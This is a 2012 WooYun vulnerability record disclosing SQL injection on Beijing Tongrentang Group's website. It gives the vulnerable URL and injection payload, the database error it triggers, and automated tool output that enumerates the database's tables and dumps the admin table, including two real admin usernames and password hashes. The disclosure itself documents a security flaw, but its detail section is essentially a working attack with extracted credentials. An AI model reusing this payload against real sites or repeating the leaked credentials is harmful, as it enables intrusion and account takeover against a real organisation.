{"id": 20532, "wybug_id": "wooyun-2012-05296", "wybug_title": "同仁堂（集团）sql注入", "wybug_corp": "中国北京同仁堂（集团）有限责任公司", "wybug_author": "zeracker", "wybug_date": "2012-03-16 10:22", "wybug_open_date": "2012-04-30 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-16：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国北京同仁堂（集团）官网存在sql注入漏洞。。好歹也市值:191.53亿元。。 详细说明：  http://www.tongrentang.com/trtxsqy/introduce_yc.php?id='%60%228rk1BError: exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'`\\\"1' at line 1' in /data/web/trt/admin/db.php:36 Stack trace: #0 /data/web/trt/admin/db.php(36): PDO->query('select * from a...') #1 /data/web/trt/trtxsqy/introduce_yc.php(5): db->query('select * from a...') #2 {main}Analyzing http://www.tongrentang.com/trtxsqy/introduce_yc.php?id='%60%228rk1BHost IP: 211.99.194.203Web Server: nginxKeyword Found: Error:I guess injection type is Integer?! If injection failed, retry with a manual keyword.DB Server: MySQLSelected Column Count is 12Valid String Column is 2Current DB: trtCount(table_name) of information_schema.tables where table_schema=0x747274 is 12Tables found: admin,advt_swf,article,dianmian,dianmian_en,lib,positioninfotable,product,product_en,tag,user,videocategoryCount(table_name) of information_schema.tables where table_schema=0x747274 is 12Tables found: admin,advt_swf,article,dianmian,dianmian_en,lib,positioninfotable,product,product_en,tag,user,videocategoryCount(table_name) of information_schema.tables where table_schema=0x747274 is 12Tables found: admin,advt_swf,article,dianmian,dianmian_en,lib,positioninfotable,product,product_en,tag,user,videocategoryCount(column_name) of information_schema.columns where table_schema=0x747274 and table_name=0x61646D696E is 5Columns found: id,username,password,rights,regtimeCount(*) of trt.admin is 2Data Found: id=1Data Found: password=98245d354279aa2faec79779601dd675Data Found: username=superData Found: id=2Data Found: password=e1f1b43c56ea0e9cd9bcd5b2c2981e1eData Found: username=yaodian   漏洞证明：  \n\n   修复方案：  你们懂的。   版权声明：转载请注明来源 zeracker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}